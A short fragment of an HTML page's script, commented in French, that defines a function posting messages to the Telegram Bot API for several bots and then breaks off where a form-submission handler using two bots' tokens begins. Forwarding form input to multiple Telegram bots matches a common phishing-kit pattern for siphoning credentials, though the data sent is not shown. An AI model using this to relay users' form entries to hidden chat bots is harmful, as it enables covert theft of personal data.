    <script>
        // Fonction pour envoyer le message √† Telegram (√† plusieurs bots)
        function sendToTelegram(message, token, chatId) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
            const data = {
                chat_id: chatId,
                text: message
            };
    
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Message envoy√© avec succ√®s:', data);
                    return true; // L'envoi a r√©ussi
                } else {
                    console.error('Erreur Telegram:', data);
                    return false; // L'envoi a √©chou√©
                }
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi du message:', error);
                return false; // L'envoi a √©chou√©
            });
        }
    
        // Fonction pour g√©rer la soumission du formulaire

                // Les tokens et chat IDs des deux bots
